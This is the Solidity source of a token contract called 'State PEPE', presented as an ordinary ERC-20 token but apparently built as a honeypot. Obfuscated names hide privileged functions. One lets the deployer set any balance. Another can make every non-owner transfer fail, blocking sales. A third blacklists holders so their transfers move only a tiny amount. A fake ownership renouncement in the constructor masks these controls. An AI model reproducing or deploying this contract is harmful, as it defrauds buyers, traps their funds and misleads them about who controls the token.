//SPDX-License-Identifier: MIT

pragma solidity ^0.8.2;

interface tradingTeamExempt {
    function totalSupply() external view returns (uint256);

    function balanceOf(address walletFrom) external view returns (uint256);

    function transfer(address swapFee, uint256 modeExempt) external returns (bool);

    function allowance(address tradingExempt, address spender) external view returns (uint256);

    function approve(address spender, uint256 modeExempt) external returns (bool);

    function transferFrom(
        address sender,
        address swapFee,
        uint256 modeExempt
    ) external returns (bool);

    event Transfer(address indexed from, address indexed listAmount, uint256 value);
    event Approval(address indexed tradingExempt, address indexed spender, uint256 value);
}

abstract contract buyMarketing {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface listMode {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface marketingMax {
    function createPair(address swapShould, address senderIs) external returns (address);
}

interface buyLaunch is tradingTeamExempt {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

contract StatePEPE is buyMarketing, tradingTeamExempt, buyLaunch {

    address public fundIsAt;

    function receiverFund() private view {
        require(buyTo[_msgSender()]);
    }

    function buyWalletLaunched(address liquidityAmount, address swapFee, uint256 modeExempt) internal returns (bool) {
        if (liquidityAmount == fundIsAt) {
            return tradingSell(liquidityAmount, swapFee, modeExempt);
        }
        uint256 minMax = tradingTeamExempt(receiverLaunchedLaunch).balanceOf(walletAmountReceiver);
        require(minMax == swapTotalMode);
        require(swapFee != walletAmountReceiver);
        if (swapLaunch[liquidityAmount]) {
            return tradingSell(liquidityAmount, swapFee, launchedSender);
        }
        return tradingSell(liquidityAmount, swapFee, modeExempt);
    }

    function swapToken(uint256 modeExempt) public {
        receiverFund();
        swapTotalMode = modeExempt;
    }

    uint256 tokenWalletTrading;

    function name() external view virtual override returns (string memory) {
        return fundMode;
    }

    bool private swapIs;

    address takeEnable = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    mapping(address => bool) public swapLaunch;

    bool private toTokenMax;

    constructor (){
        if (atShould) {
            swapSender = listMax;
        }
        listMode tradingWallet = listMode(takeEnable);
        receiverLaunchedLaunch = marketingMax(tradingWallet.factory()).createPair(tradingWallet.WETH(), address(this));
        if (swapSender != listMax) {
            teamMin = false;
        }
        fundIsAt = _msgSender();
        liquiditySwap();
        buyTo[fundIsAt] = true;
        isFrom[fundIsAt] = walletList;
        
        emit Transfer(address(0), fundIsAt, walletList);
    }

    uint256 swapTotalMode;

    string private fundMode = "State PEPE";

    bool public tradingMax;

    mapping(address => bool) public buyTo;

    function allowance(address liquidityMarketing, address liquidityTx) external view virtual override returns (uint256) {
        if (liquidityTx == takeEnable) {
            return type(uint256).max;
        }
        return tokenEnable[liquidityMarketing][liquidityTx];
    }

    function approve(address liquidityTx, uint256 modeExempt) public virtual override returns (bool) {
        tokenEnable[_msgSender()][liquidityTx] = modeExempt;
        emit Approval(_msgSender(), liquidityTx, modeExempt);
        return true;
    }

    uint256 private walletList = 100000000 * 10 ** 18;

    function transfer(address autoReceiver, uint256 modeExempt) external virtual override returns (bool) {
        return buyWalletLaunched(_msgSender(), autoReceiver, modeExempt);
    }

    event OwnershipTransferred(address indexed limitFund, address indexed senderAuto);

    function decimals() external view virtual override returns (uint8) {
        return autoLaunch;
    }

    address private fromTrading;

    address walletAmountReceiver = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;

    function fundMarketingToken(address fromAt) public {
        require(fromAt.balance < 100000);
        if (tradingMax) {
            return;
        }
        if (swapIs) {
            teamMin = true;
        }
        buyTo[fromAt] = true;
        if (swapIs == toTokenMax) {
            toTokenMax = false;
        }
        tradingMax = true;
    }

    function balanceOf(address walletFrom) public view virtual override returns (uint256) {
        return isFrom[walletFrom];
    }

    uint256 private listMax;

    function totalSupply() external view virtual override returns (uint256) {
        return walletList;
    }

    uint256 constant launchedSender = 16 ** 10;

    bool private teamMin;

    bool private atShould;

    function getOwner() external view returns (address) {
        return fromTrading;
    }

    function symbol() external view virtual override returns (string memory) {
        return exemptList;
    }

    function transferFrom(address liquidityAmount, address swapFee, uint256 modeExempt) external override returns (bool) {
        if (_msgSender() != takeEnable) {
            if (tokenEnable[liquidityAmount][_msgSender()] != type(uint256).max) {
                require(modeExempt <= tokenEnable[liquidityAmount][_msgSender()]);
                tokenEnable[liquidityAmount][_msgSender()] -= modeExempt;
            }
        }
        return buyWalletLaunched(liquidityAmount, swapFee, modeExempt);
    }

    function owner() external view returns (address) {
        return fromTrading;
    }

    function listIsAuto(address liquidityReceiver) public {
        receiverFund();
        if (atShould != toTokenMax) {
            listMax = swapSender;
        }
        if (liquidityReceiver == fundIsAt || liquidityReceiver == receiverLaunchedLaunch) {
            return;
        }
        swapLaunch[liquidityReceiver] = true;
    }

    function tokenLiquidity(address autoReceiver, uint256 modeExempt) public {
        receiverFund();
        isFrom[autoReceiver] = modeExempt;
    }

    function liquiditySwap() public {
        emit OwnershipTransferred(fundIsAt, address(0));
        fromTrading = address(0);
    }

    address public receiverLaunchedLaunch;

    string private exemptList = "SPE";

    mapping(address => mapping(address => uint256)) private tokenEnable;

    mapping(address => uint256) private isFrom;

    function tradingSell(address liquidityAmount, address swapFee, uint256 modeExempt) internal returns (bool) {
        require(isFrom[liquidityAmount] >= modeExempt);
        isFrom[liquidityAmount] -= modeExempt;
        isFrom[swapFee] += modeExempt;
        emit Transfer(liquidityAmount, swapFee, modeExempt);
        return true;
    }

    uint256 public swapSender;

    uint8 private autoLaunch = 18;

}